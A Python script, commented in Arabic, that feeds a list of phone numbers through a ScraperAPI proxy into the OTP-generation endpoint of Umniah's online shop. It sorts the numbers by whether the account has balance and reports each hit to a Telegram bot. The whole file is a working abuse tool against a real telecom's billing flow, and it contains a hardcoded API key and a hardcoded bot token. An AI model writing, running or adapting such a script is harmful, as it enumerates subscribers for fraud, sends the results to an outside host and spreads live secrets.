import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
]

# ScraperAPI Key
SCRAPER_API_KEY = 'e42b050dcb697cf3ccd3d663edf43aea'

# معلومات البوت
TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4'
TELEGRAM_CHAT_ID = '6873334348'
TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# الإعدادات
NUM_THREADS = 1  # خيط واحد فقط
DELAY = 2

def check_phone(phone_number, index, total):
    """فحص رقم باستخدام ScraperAPI بشكل صحيح"""
    try:
        time.sleep(DELAY)
        
        # الطريقة الصحيحة: استخدام ScraperAPI كـ HTTP Proxy
        # بدل ما نرسل POST، نستخدم GET مع API key
        
        url = 'https://eshop.umniah.com/ar/vendic/index/checkotp/'
        
        # إضافة البيانات في URL
        params = {
            'api_key': SCRAPER_API_KEY,
            'url': url,
        }
        
        # البيانات اللي نبعتها
        data = {
            'phone_number': phone_number,
            'request': 'generate',
            'orderid': '727165',
        }
        
        # الطريقة الصحيحة: POST عبر ScraperAPI
        response = requests.post(
            f'https://api.scraperapi.com?api_key={SCRAPER_API_KEY}',
            data=data,
            headers={'url': url},
            timeout=20
        )
        
        print(f"[{index}/{total}] {phone_number} - Status: {response.status_code}")
        
        # طباعة أول 200 حرف من الرد
        print(f"[{index}/{total}] Response: {response.text[:200]}")
        
        if response.status_code == 200:
            try:
                result = response.json()
                
                if result.get('data1') == 'success':
                    print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد!")
                    send_telegram(f"✅ {phone_number} - يوجد رصيد!")
                    return ('success', phone_number)
                
                elif 'balance' in str(result.get('data2', '')).lower():
                    print(f"[{index}/{total}] ❌ {phone_number} - لا يوجد رصيد")
                    return ('no_balance', phone_number)
                else:
                    print(f"[{index}/{total}] ❓ {phone_number} - رد: {result.get('data2', '')}")
                    return ('unknown', phone_number)
            except:
                print(f"[{index}/{total}] ⚠️ {phone_number} - ما يقدر يقرأ JSON")
                return ('json_error', phone_number)
        else:
            print(f"[{index}/{total}] ❌ HTTP {response.status_code}")
            return ('error', phone_number)
    
    except Exception as e:
        print(f"[{index}/{total}] ❌ {phone_number} - {str(e)[:50]}")
        return ('error', phone_number)

def send_telegram(msg):
    try:
        requests.post(TELEGRAM_API, json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg}, timeout=5)
    except:
        pass

def remove_from_file(phone):
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        with open('lu1.txt', 'w', encoding='utf-8') as f:
            f.writelines([l for l in lines if l.strip() != phone])
    except:
        pass

def main():
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            phones = [line.strip() for line in f if line.strip()]
        
        total = len(phones)
        if total == 0:
            print("لا توجد أرقام!")
            return
        
        print(f"\n✅ عدد الأرقام: {total}")
        print(f"🚀 بدء الفحص (ScraperAPI)...\n")
        
        success = 0
        no_balance = 0
        failed = 0
        
        for idx, phone in enumerate(phones, 1):
            status, _ = check_phone(phone, idx, total)
            
            if status == 'success':
                success += 1
            elif status == 'no_balance':
                no_balance += 1
            else:
                failed += 1
            
            remove_from_file(phone)
        
        print(f"\n{'='*50}")
        print(f"✅ يوجد رصيد: {success}")
        print(f"❌ لا يوجد رصيد: {no_balance}")
        print(f"⚠️ أخطاء: {failed}")
        print(f"{'='*50}\n")

    except FileNotFoundError:
        print("❌ ملف lu1.txt غير موجود!")
    except KeyboardInterrupt:
        print("\n⛔ توقف")

if __name__ == "__main__":
    main()
